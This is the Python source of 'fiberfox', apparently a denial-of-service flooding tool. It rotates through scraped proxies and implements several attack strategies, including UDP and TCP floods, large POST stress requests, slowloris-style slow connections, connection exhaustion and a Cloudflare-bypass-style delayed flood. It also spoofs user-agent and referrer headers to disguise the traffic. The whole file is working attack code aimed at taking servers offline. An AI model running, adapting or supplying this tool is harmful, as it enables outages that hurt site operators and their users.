#!/usr/bin/env python3

from argparse import ArgumentParser, Namespace
import asks
from certifi import where
from collections import defaultdict, deque
from contextlib import suppress, asynccontextmanager
import curio
from curio import ssl, socket
from dataclasses import dataclass, field
from functools import partial
import json
from logging import basicConfig, getLogger
from math import log2, trunc
from pathlib import Path
from python_socks import ProxyTimeoutError
from python_socks.async_.curio import Proxy
from random import choice, randrange
import re
import socket as syncsocket
from sparklines import sparklines
import string
from tabulate import tabulate
import time
from typing import Any, Callable, Dict, Generator, List, Optional, Set, Tuple, Union
from yarl import URL
from urllib import parse

try:
    from random import randbytes
except ImportError:
    from os import urandom
    randbytes = urandom

# todo:
# * keep proxies cache in the file, reload proxies, retry after "dead", "kill switch"
# * stats: better numbers, on KeyboardInterrupt, list of errors
# * implement the rest of the attacks
# * read referres/useragents from files
# * run as a package "python -m fiberfox", programmatic launch


basicConfig(format="[%(asctime)s - %(levelname)s] %(message)s", datefmt="%H:%M:%S")


# xxx(okachaiev): try out "hummanize" package
def humanbytes(i: int, binary: bool = False, precision: int = 2):
    multiplies = [
        "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
    ]
    if i == 0: return f"-- B"
    base = 1024 if binary else 1000
    multiple = trunc(log2(i) / log2(base))
    value = i / pow(base, multiple)
    suffix = multiplies[multiple].format("i" if binary else "")
    return f"{value:.{precision}f} {suffix}"


PROTOCOLS = {"tcp", "http", "https", "udp", "socks4", "socks5"}
RE_IPPORT = re.compile("^((?:\d+.){3}\d+):(\d{1,5})$")

SSL_CTX = ssl.create_default_context(cafile=where())
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

ERR_NO_BUFFER_AVAILABLE = 55


@dataclass
class Target:

    protocol: str
    addr: str
    port: int
    url: Optional[URL] = None
    
    @classmethod
    def from_string(cls, target: str, resolve_addr:bool = True) -> "Target":
        url = URL(target)
        if not url.scheme or url.scheme not in PROTOCOLS:
            url = URL(f"tcp://{target}")
        # the configuration is only setup in the beginning
        # so there's no need we are completely fine doing this synchronosly
        addr = syncsocket.gethostbyname(url.host) if resolve_addr else url.host
        return cls(protocol=url.scheme.lower(), addr=addr, port=int(url.port or 80), url=url)

    @property
    def ssl_context(self) -> Optional[ssl.SSLContext]:
        if self.protocol != "https" and self.port != 443: return None
        return SSL_CTX


def proxy_type_to_protocol(proxy_type: Union[int, str]) -> str:
    if proxy_type == 4: return "socks4"
    if proxy_type == 5: return "socks5"
    if isinstance(proxy_type, int): return "http"
    if proxy_type.lower() == "socks4": return "socks4"
    if proxy_type.lower() == "socks5": return "socks5"
    return "http"


async def load_from_provider(ctx: "Context", provider, proxies: List[str]) -> None:
    proto = proxy_type_to_protocol(provider["type"])
    ctx.logger.info(f"Loading proxies from url={provider['url']} type={proto}")
    try:
        response = await asks.get(provider["url"], timeout=provider["timeout"])
    except Exception as e:
        ctx.track_error(f"Proxy provider error: {provider['url']} {e}")
        return
    if response.status_code != 200: return
    for line in response.text.splitlines():
        match = RE_IPPORT.search(line)
        if match:
            proxies.append(f"{proto}://{match.group(1)}:{match.group(2)}")


async def try_connect_proxy(
    ctx: "Context",
    proxy_url: str,
    timeout_seconds: int,
    proxies: List[str]
) -> None:
    proxy = Proxy.from_url(proxy_url)
    try:
        conn = await curio.timeout_after(
            timeout_seconds, curio.open_connection, proxy.proxy_host, proxy.proxy_port)
        await conn.close()
    except Exception as e:
        ctx.track_error(f"Proxy conn error: {proxy_url} {e}")
    else:
        proxies.append(proxy_url)


class ProxySet:

    def __init__(self, proxies: List[str]):
        self._proxies = set(proxies)
        self._dead_proxies: Dict[str, int] = {}

    def __len__(self) -> int:
        return len(self._proxies)

    def __next__(self) -> Tuple[str, Proxy]:
        url = choice(list(self._proxies))
        return (url, Proxy.from_url(url))

    # xxx(okachaiev): now we can re-try after some time
    def mark_dead(self, proxy_url: str) -> "ProxySet":
        self._proxies.discard(proxy_url)
        self._dead_proxies[proxy_url] = time.time()
        return self

    def __str__(self):
        num_alive, num_dead = len(self), len(self._dead_proxies)
        if num_alive + num_dead == 0:
            return "ProxySet[empty]"
        else:
            ratio = num_alive/(num_alive + num_dead)
            return f"ProxySet[{num_alive}/{num_alive+num_dead} {ratio:0.1f}%]"

    @classmethod
    def from_list(cls, proxies: List[str]) -> "ProxySet":
        return cls(proxies=[p.strip() for p in proxies if p.strip()])

    @classmethod
    def from_file(cls, path: Union[str, Path]) -> "ProxySet":
        with open(path) as f:
            proxies = f.read().splitlines()
        return cls.from_list(proxies)

    @classmethod
    async def from_providers(cls, ctx: "Context", providers: List[Any]) -> "ProxySet":
        proxies = []
        async with curio.TaskGroup() as g:
            for provider in providers:
                await g.spawn(load_from_provider, ctx, provider, proxies)
        alive_proxies = []
        timeout_seconds = 5
        if proxies:
            async with curio.TaskGroup() as g:
                for proxy_url in proxies:
                    await g.spawn(
                        try_connect_proxy, ctx, proxy_url, timeout_seconds, alive_proxies)
        return cls(proxies=alive_proxies)

    @classmethod
    def from_providers_config(cls, ctx: "Context", path: str) -> "ProxySet":
        with open(path) as f:
            providers = json.load(f)["proxy-providers"]
        return cls.from_providers(ctx, providers)


class Stats:
    def __init__(self, hist_buckets: int = 10, hist_max: int = 1024):
        self.total_bytes_sent: int = 0
        self.packets_sent: int = 0
        self._hist_buckets: int = hist_buckets
        self._hist_max: int = hist_max
        self.current_session: Dict[int, int] = defaultdict(int)
        # the last bucket is dedicated for 100% succesfull execution only
        self.packets_per_session: List[int] = [0]*(self._hist_buckets+1)

    def track_packet_sent(self, fid: int, size: int) -> None:
        self.total_bytes_sent += size
        self.packets_sent += 1
        if self._hist_buckets > 0:
            self.current_session[fid] += 1

    def reset_session(self, fid: int) -> None:
        if self._hist_buckets > 0:
            packets_sent = self.current_session[fid]
            bucket = int(self._hist_buckets*packets_sent/self._hist_max)
            try: 
                self.packets_per_session[bucket] += packets_sent
            except IndexError:
                # xxx(okachaiev): fix this later
                pass
            self.current_session[fid] = 0


class Context:
    def __init__(
        self,
        *,
        args: Namespace,
        targets: List[Target],
        strategy: Callable[["Context", int, Target], None],
        proxies: Optional[ProxySet] = None,
        num_fibers: int = 20,
        packet_size: int = 1024,
        rpc: int = 1000,
        duration_seconds: int = 10,
        connection_timeout_seconds: int = 10,
        log_level: str = "INFO",
    ):
        self.args = args
        self.targets = targets
        self.strategy = strategy
        self.proxies = proxies
        self.num_fibers = num_fibers
        self.packet_size = packet_size
        self.rpc = rpc
        self.duration_seconds = duration_seconds
        self.connection_timeout_seconds = connection_timeout_seconds
        
        hist_buckets = 10 if rpc >= 10 else 0 # no need to track hist if RPC is small
        self.stats: Dict[URL, Stats] = defaultdict(lambda: Stats(hist_max=rpc))
        self.num_errors: int = 0
        self.errors: deque = deque([], maxlen=100)
        self.logger = getLogger("fiberfox")
        self.logger.setLevel(log_level.upper())

    @property
    def connection_timeout(self):
        return min(self.connection_timeout_seconds, self.duration_seconds)

    def track_packet_sent(self, fid: int, target: Target, size: int) -> None:
        if size > 0:
            self.stats[target.url].track_packet_sent(fid, size)

    def reset_session(self, fid: int, target: Target) -> None:
        self.stats[target.url].reset_session(fid)

    def track_error(self, exc: Union[Exception, str]) -> None:
        self.logger.debug(exc)
        self.num_errors += 1
        self.errors.append(str(exc))

    @classmethod
    def from_args(cls, args: Namespace) -> "Context":
        targets = [Target.from_string(t.strip()) for t in args.targets]
        return cls(
            args=args,
            targets=targets,
            num_fibers=args.concurrency,
            strategy=args.strategy,
            rpc=args.rpc,
            packet_size=args.packet_size,
            duration_seconds=args.duration_seconds,
            log_level=args.log_level,
            connection_timeout_seconds=args.connection_timeout_seconds,
        )


useragents: List[str] = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169',
    'Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120',
    'Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90',
    'Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
]

referrers: List[str] = [
    "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
    "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
    "https://drive.google.com/viewerng/viewer?url=",
    "https://www.google.com/translate?u="
]


# xxx(okachaiev): would be good to have a library to manage encodings only
def http_req_get(target: Target) -> bytes:
    version = choice(["1.1", "1.2"])
    return (
        f"GET {target.url.raw_path_qs} HTTP/{version}\r\n"
        f"Host: {target.url.authority}\r\n\r\n"
    ).encode()


def http_req_payload(
        target: Target,
        req_type: str = "GET",
        req: Optional[List[str]] = None
    ) -> bytes:
    version = choice(["1.1", "1.2"])
    user_agent = choice(useragents)
    referrer = choice(referrers) + parse.quote(target.url.human_repr())
    parts = [
        f"{req_type} {target.url.raw_path_qs} HTTP/{version}",
        f"Host: {target.url.authority}",
        f"User-Agent: {user_agent}",
        f"Referrer: {referrer}",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: en-US,en;q=0.9",
        "Cache-Control: max-age=0",
        "Connection: Keep-Alive",
        "Sec-Fetch-Dest: document",
        "Sec-Fetch-Mode: navigate",
        "Sec-Fetch-Site: none",
        "Sec-Fetch-User: 1",
        "Sec-Gpc: 1",
        "Pragma: no-cache",
    ]
    if req:
        parts += req
    return ("\r\n".join(parts) + "\r\n\r\n").encode()


def rand_str(size: int) -> str:
    return "".join(choice(string.ascii_letters) for _ in range(size)) 


async def connect_via_proxy(ctx: Context, proxy: Proxy, target: Target):
    conn = await proxy.connect(target.addr, target.port, timeout=ctx.connection_timeout)
    if target.ssl_context is not None:
        conn = await target.ssl_context.wrap_socket(
            conn, do_handshake_on_connect=True, server_hostname=None)
    return conn


class TcpConnection:
    """Hopefully, one day, this implementation will make flood _v2
    more convenient than the first version. But I need to make it
    work first.
    """

    def __init__(self, ctx: Context, target: Target):
        self._ctx: Context = ctx
        self._target: Target = target
        self._sock = None
        self._proxy_url: Optional[str] = None
        self._packet_sent: bool = False

    @property
    def sock(self):
        return self._sock

    def mark_packet_sent(self):
        self._packet_sent = True

    async def __aenter__(self):
        if self._ctx.proxies:
            self._proxy_url, proxy = next(self._ctx.proxies)
            conn = connect_via_proxy(self._ctx, proxy, self._target)
        else:
            conn = curio.open_connection(
                self._target.addr, self._target.port, ssl=self._target.ssl_context)
        try:
            self._sock = await curio.timeout_after(self._ctx.connection_timeout, conn)
        except Exception as e:
            pass
        return self

    async def __aexit__(self, exc_t, exc_v, exc_tb):
        if exc_t:
            if isinstance(exc_v, curio.errors.TaskCancelled):
                return True
            print(exc_t, exc_v, isinstance(exc_t, curio.errors.TaskCancelled))
        if self._sock:
            await self._sock.close()
        if self._proxy_url and not self._packet_sent:
            self._ctx.proxies.mark_dead(self._proxy_url)
        return True


async def flood_packets_gen_v2(ctx, fid, target, packets):
    async with TcpConnection(ctx, target) as conn:
        if conn.sock:
            stream = conn.sock.as_stream()
            async for payload in packets:
                conn.mark_packet_sent()
                ctx.track_packet_sent(fid, target, len(payload))


async def flood_packets_gen(
    ctx: Context,
    fid: int,
    target: Target,
    packets: Generator[bytes, None, None]
):
    packet_sent, stream, proxy_url, proxy = 0, None, None, None
    try:
        if ctx.proxies:
            proxy_url, proxy = next(ctx.proxies)
            conn = connect_via_proxy(ctx, proxy, target)
        else:
            conn = curio.timeout_after(
                ctx.connection_timeout,
                curio.open_connection(target.addr, target.port, ssl=target.ssl_context))
        conn = await conn
        stream = conn.as_stream()
        async with curio.meta.finalize(packets) as packets:
            async for payload in packets:
                await stream.write(payload)
                ctx.track_packet_sent(fid, target, len(payload))
                packet_sent += 1
    except curio.TaskTimeout:
        # xxx(okachaiev): how to differentiate proxy connection vs. target connection?
        # if the target is dead, we should not remove proxy from the pool
        ctx.track_error(f"Connection timeout proxy={proxy_url} target={target.url}")
        if proxy_url:
            ctx.proxies.mark_dead(proxy_url)
        return 0
    except ProxyTimeoutError as e:
        # xxx(okachaiev): how to differentiate proxy connection vs. target connection?
        # if the target is dead, we should not remove proxy from the pool
        ctx.track_error(e)
        ctx.proxies.mark_dead(proxy_url)
    except Exception as e:
        # xxx(okachaiev): some errors should be a reason to remove proxy from the pool,
        # e.g. when negotiation failed
        ctx.track_error(f"Proxy error: proxy={proxy_url} target={target.url} {e}")
        return packet_sent
    finally:
        if stream:
            await stream.close()
        if proxy:
            await proxy._close()
    return packet_sent


async def UDP(ctx: Context, fid: int, target: Target):
    async with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        running = True
        while running:
            try:
                sent = await sock.sendto(randbytes(ctx.packet_size), (target.addr, target.port))
                ctx.track_packet_sent(fid, target, sent)
                running = sent > 0
            except OSError as exc:
                if exc.errno == ERR_NO_BUFFER_AVAILABLE:
                    # typically this happens when there are too many fibers
                    # which is not necessary for UDP traffic
                    await curio.sleep(1)
                else:
                    running = False
                    ctx.track_error(exc)


async def TCP(ctx: Context, fid: int, target: Target):
    """Sends RPC randomly generated TCP packets into open TCP connection.

    Layer: L4.
    """
    async def gen():
        for _ in range(ctx.rpc):
            yield randbytes(ctx.packet_size)

    await flood_packets_gen(ctx, fid, target, gen())


async def GET(ctx: Context, fid: int, target: Target):
    """Sends RPC randomly generated HTTP GET requests into open TCP connection.

    Layer: L7.
    """
    async def gen():
        req: bytes = http_req_payload(target, "GET")
        for _ in range(ctx.rpc):
            yield req

    await flood_packets_gen(ctx, fid, target, gen())


async def STRESS(ctx: Context, fid: int, target: Target):
    """Sends large HTTP packates.

    To maximize performance, make sure that target host allows
    pipelining (sending new request within persistent connection without
    reading response first).
    """
    async def gen():
        for _ in range(ctx.rpc):
            req = [
                f"Content-Length: {ctx.packet_size+12}",
                "X-Requested-With: XMLHttpRequest",
                "Content-Type: application/json\r\n",
                '{"data": %s}' % rand_str(ctx.packet_size)
            ]
            yield http_req_payload(target, "POST", req)
    
    await flood_packets_gen(ctx, fid, target, gen())


async def BYPASS(ctx: Context, fid: int, target: Target):
    """Sends HTTP get requests (RPC requests per TCP connection)."""
    async with TcpConnection(ctx, target) as conn:
        if conn.sock:
            for _ in range(ctx.rpc):
                req, chunks = http_req_get(target), []
                bytes_sent = await conn.sock.sendall(req)
                if bytes_sent is None or bytes_sent == len(req):
                    while True:
                        chunk = await conn.sock.recv(1024)
                        if not chunk:
                            break
                        chunks.append(chunk)
                else:
                    ctx.logger.error(f"connection closed: {bytes_sent}/{len(req)}")
                ctx.track_packet_sent(fid, target, (bytes_sent or 0) + sum(map(len, chunks)))


async def CONNECTION(ctx: Context, fid: int, target: Target):
    """Opens TCP connections and keeps it alives as long as possible.

    Layer: L4.

    To be effective, this type of attack requires higher number of
    fibers than usual. Note that modern servers are pretty good with
    handling open inactive connections."""
    async with TcpConnection(ctx, target) as conn:
        if conn.sock:
            conn.mark_packet_sent()
            while await conn.sock.recv(1):
                ctx.track_packet_sent(fid, target, 1)


# xxx(okachaiev): configuration for time delay
async def SLOW(ctx: Context, fid: int, target: Target):
    """Similary to STRESS, issues RPC HTTP requests and makes an
    attempt to keep connection utilized by reading back a single byte
    and sending additional payload with time delays between
    send operations.

    Layer: L7.

    Ideally, time delay should be setup properly
    to avoid connection being reset by the peer because of read
    timeout (depends on peer setup).
    """
    # xxx(okachaiev): should this be generated randomly each time?
    req: bytes = http_req_payload(target, "GET")
    async with TcpConnection(ctx, target) as conn:
        if conn.sock:
            for _ in range(ctx.rpc):
                bytes_sent = await conn.sock.sendall(req)
                ctx.track_packet_sent(fid, target, bytes_sent or 0)
            while True:
                bytes_sent = await conn.sock.sendall(req)
                if bytes_sent is not None and bytes_sent < len(req):
                    break
                await conn.sock.recv(1)
                header = f"X-a: {randint(1,5000)}\r\n".encode()
                header_bytes_sent = await conn.sock.sendall(header)
                # xxx(okachaiev): this will overflow as we are sending too many
                # requests here (infinitely more than RPC). need to find a wayt
                # to track this properly
                ctx.track_packet_sent(fid, target, (bytes_sent or 0)+(header_bytes_sent or 0))
                await curio.sleep(ctx.rpc/15) # xxx(okachaiev): too long?


# xxx(okachaiev): configuration for delay and for timeout
async def CFBUAM(ctx: Context, fid: int, target: Target):
    """Sends a single HTTP GET, after a long delay issues RPC new requests.

    Layer: L7.
    """
    # xxx(okachaiev): should this be generated randomly each time?
    req: bytes = http_req_payload(target, "GET")
    async with TcpConnection(ctx, target) as conn:
        if conn.sock:
            bytes_sent = await conn.sock.sendall(req)
            if bytes_sent is not None and bytes_sent < len(req): return
            await curio.sleep(5.01)
            with curio.ignore_after(120):
                for _ in range(ctx.rpc):
                    bytes_sent = await conn.sock.sendall(req)
                    if bytes_sent is not None and bytes_sent < len(req): return
                    ctx.track_packet_sent(fid, target, bytes_sent or 0)


# xxx(okachaiev): flexible delay configuration
async def AVB(ctx: Context, fid: int, target: Target):
    """Isses HTTP GET packets into the open connection with long
    delays between send operations. To avoid the connection being
    reset by the peer because of read timeout, maximum delay is set
    to 1 second.

    Layer: L7.
    """
    async def gen():
        # xxx(okachaiev): should this payload be randomized on each cycle?
        req: bytes = http_req_payload(target, "GET")
        for _ in range(ctx.rpc):
            await curio.sleep(max(ctx.rpc/1000, 1))
            yield req

    await flood_packets_gen(ctx, fid, target, gen())


async def DGB(ctx: Context, fid: int, target: Target):
    """Sends a single HTTP GET request, copies cookie values from the
    response. After that issues RPC additional GET requests with a delay
    between them. The response is properly consumed from the network.

    Layer: L7.

    Implementational note: MHDDoS impl. uses Session object from
    the Python's requests package that does not guarantee reuse of
    underlying TCP connection. Which means HTTP-layer attach would
    work even if the target server does not support persistent re-usable
    connections.
    """
    pass


async def flood_fiber(fid: int, ctx: Context, target: Target):
    while True:
        # run a flood session (for TCP connections this would typically mean
        # sending RPC number of packets)
        await ctx.strategy(ctx, fid, target)
        # resetting session is only used stats tracking (per session packets hist)
        # xxx(okachaiev): this might be done as context manager with "ContextSession"
        ctx.reset_session(fid, target)


async def load_proxies(ctx: Context):
    if ctx.args.proxies:
        proxy_set = ProxySet.from_list(ctx.args.proxies)
    elif ctx.args.proxies_list:
        proxy_set = ProxySet.from_file(ctx.args.proxies_list)
    elif ctx.args.providers_config:
        print(f"==> Loading proxy servers from providers")
        # xxx(okachaiev): cache into file
        proxy_set = await ProxySet.from_providers_config(ctx, ctx.args.providers_config)
    else:
        proxy_set = ProxySet(proxies=[])
    if proxy_set:
        print(f"☂ Loaded {len(proxy_set)} proxies")
    ctx.proxies = proxy_set


async def flood(ctx: Context):
    # xxx(okachaiev): periodically reload
    await load_proxies(ctx)

    group = curio.TaskGroup()
    for target in ctx.targets:
        print(f"==> Launching {ctx.num_fibers} fibers "
              f"targeting {target.url} for {ctx.duration_seconds}s")
        for fid in range(ctx.num_fibers):
            await group.spawn(flood_fiber, fid, ctx, target)

    started_at = time.time()
    while time.time() < started_at + ctx.duration_seconds:
        await curio.sleep(10)
        show_stats(ctx, time.time()-started_at)

    print("==> Initializing shutdown...")
    timeout = object()
    terminted = await curio.ignore_after(10, group.cancel_remaining(), timeout_result=timeout)
    if terminted is timeout:
        ctx.logger.warning("Shutdown timeout, forcing termination")
    await group.join()

    end_at = time.time()
    show_final_stats(ctx, end_at-started_at, sign="🥃")


def show_stats(ctx: Context, elapsed_seconds: int, sign="🦊"):
    for target in ctx.targets:
        total_bytes_sent = ctx.stats[target.url].total_bytes_sent
        bytes_sent_repr = humanbytes(total_bytes_sent, True)
        rate = humanbytes(total_bytes_sent/elapsed_seconds, True)
        progress = 100*elapsed_seconds/ctx.duration_seconds
        ctx.logger.info(
            f"{sign} {target.url}\t{progress:0.2f}%\t"
            f"Sent {bytes_sent_repr} in {elapsed_seconds:0.2f}s ({rate}ps)\t"
            f"{ctx.proxies}")


def show_final_stats(ctx: Context, elapsed_seconds: int, sign=""):
    rows = []
    for target in ctx.targets:
        total_bytes_sent = ctx.stats[target.url].total_bytes_sent
        bytes_sent_repr = humanbytes(total_bytes_sent, True)
        rate = humanbytes(total_bytes_sent/elapsed_seconds, True)
        buckets = ctx.stats[target.url].packets_per_session
        rows.append([
            target.url,
            ctx.stats[target.url].packets_sent,
            bytes_sent_repr,
            rate+"/s",
            "\n".join(sparklines(buckets)) if sum(buckets) > 0 else "n/a",
        ])
    print(
        f"{sign} Time spent: {elapsed_seconds:0.2f}s, "
        f"errors registered: {ctx.num_errors}. "
        f"Enjoy the results:")
    print(tabulate(rows, headers=["Target", "Packets", "Traffic", "Rate", "Sessions"]))


default_strategies = {
    "udp": UDP,
    "tcp": TCP,
    "stress": STRESS,
    "bypass": BYPASS,
    "connection": CONNECTION,
    "slow": SLOW,
    "cfbuam": CFBUAM,
    "avb": AVB,
    "get": GET,
}


def parse_args(available_strategies):
    parser = ArgumentParser()
    parser.add_argument(
        "--targets",
        nargs="*",
        help="List of targets, separated by spaces (if many)"
    )
    parser.add_argument(
        "-c",
        "--concurrency",
        type=int,
        default=8,
        help="Number of fibers per target (for TCP means max number of open connections)"
    )
    parser.add_argument(
        "-s",
        "--strategy",
        default="STRESS",
        choices=[s.upper() for s in default_strategies.keys()],
        help="Flood strategy to utilize"
    )
    parser.add_argument(
        "--rpc",
        type=int,
        default=100,
        help="Number of requests to be sent to each connection"
    )
    parser.add_argument(
        "--packet-size",
        type=int,
        default=1024,
        help="Packet size (in bytes)"
    )
    parser.add_argument(
        "-d",
        "--duration-seconds",
        type=int,
        default=10,
        help="How long to keep sending packets, in seconds"
    )
    parser.add_argument(
        "--providers-config",
        type=Path,
        default=None,
        help="Configuration file with proxy providers"
    )
    parser.add_argument(
        "--proxies-list",
        type=Path,
        default=None,
        help="List proxies"
    )
    parser.add_argument(
        "--proxies",
        nargs="*",
        help="List of proxy servers, separated by spaces (if many)"
    )
    parser.add_argument(
        "--log-level",
        default="INFO",
        choices=["DEBUG", "INFO", "ERROR", "WARN"],
        help="Log level (defaults to INFO)"
    )
    parser.add_argument(
        "--connection-timeout-seconds",
        type=int,
        default=10,
        help="Proxy connection timeout in seconds (default: 10s)"
    )
    args = parser.parse_args()

    if not args.targets:
        raise ValueError("Targets list is empty")

    if args.providers_config and not args.providers_config.exists():
        raise ValueError("Proxy providers configuration file does not exist")

    if args.proxies_list and not args.proxies_list.exists():
        raise ValueError("File with proxies does not exist")

    args.strategy = available_strategies[args.strategy.lower()]

    return args


def run():
    ctx = Context.from_args(parse_args(default_strategies))
    curio.run(flood(ctx))
    exit(0)


if __name__ == "__main__":
    run()
